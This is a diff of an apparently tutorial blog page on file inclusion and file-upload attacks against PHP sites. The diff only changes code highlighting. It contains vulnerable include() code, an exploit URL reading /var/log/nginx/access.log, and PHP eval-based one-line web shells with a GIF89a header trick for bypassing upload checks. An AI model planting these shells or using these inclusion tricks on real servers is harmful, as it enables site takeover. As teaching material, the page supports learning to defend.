@@ -17,7 +17,7 @@
 <meta property="og:url" content="https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-wen-jian-shang-chuan-2.html">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Meekdai/meekdai.github.io/logo64.jpg">
 <title>小白学网安之文件上传2</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -179,11 +179,10 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>当Web应用允许包含“用户可控的绝对路径”时，可直接指定系统敏感文件，无需关心当前脚本目录：</p>
 <ul>
 <li>漏洞代码示例（PHP）：
-<pre lang="php" class="notranslate"><code class="notranslate">&lt;?php
-$file = $_GET['file']; // 用户可控参数
-include($file); // 无过滤直接包含
-?&gt;
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-s1"><span class="pl-c1">$</span>file</span> = <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">file</span>'</span>]; <span class="pl-c">// 用户可控参数</span>
+<span class="pl-k">include</span>(<span class="pl-s1"><span class="pl-c1">$</span>file</span>); <span class="pl-c">// 无过滤直接包含</span>
+<span class="pl-ent">?&gt;</span></pre></div>
 </li>
 <li>渗透利用（直接传入绝对路径）：
 <pre class="notranslate"><code class="notranslate">
@@ -259,11 +258,10 @@ http://target.com/lfi.php?file=/var/log/nginx/access.log
 <ul>
 <li>
 <p>漏洞场景：Web脚本在 <code class="notranslate">/var/www/html/admin/</code> 目录下，代码如下（无过滤<code class="notranslate">../</code>）：</p>
-<pre lang="php" class="notranslate"><code class="notranslate">&lt;?php
-$file = $_GET['file'];
-include("./includes/" . $file); // 拼接当前目录下的includes子目录
-?&gt;
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-s1"><span class="pl-c1">$</span>file</span> = <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">file</span>'</span>];
+<span class="pl-k">include</span>(<span class="pl-s">"<span class="pl-s">./includes/</span>"</span> . <span class="pl-s1"><span class="pl-c1">$</span>file</span>); <span class="pl-c">// 拼接当前目录下的includes子目录</span>
+<span class="pl-ent">?&gt;</span></pre></div>
 </li>
 <li>
 <p>渗透利用（通过<code class="notranslate">../</code>回溯）：<br>
@@ -352,8 +350,7 @@ include("./includes/" . $file); // 拼接当前目录下的includes子目录
 <p>注意：任何文件都有头 比如 zip是pk头 比如png 是xpng 比如gif 是GIF89a等等<br>
 把自己的木马丰满一下 加上GIF89a</p>
 <h3>变形马知识 这里引进一句修改之后的木马:</h3>
-<pre lang="php" class="notranslate"><code class="notranslate">&lt;script language = "php"&gt;@eval(_POST[w]);&lt;/script&gt;
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">&lt;script language = <span class="pl-s">"<span class="pl-s">php</span>"</span>&gt;@<span class="pl-en">eval</span>(<span class="pl-c1">_POST</span>[w]);&lt;/script&gt;</pre></div>
 <pre class="notranslate"><code class="notranslate">过滤php
 (适用于php7)
 &lt;?=eval($_POST[w]);
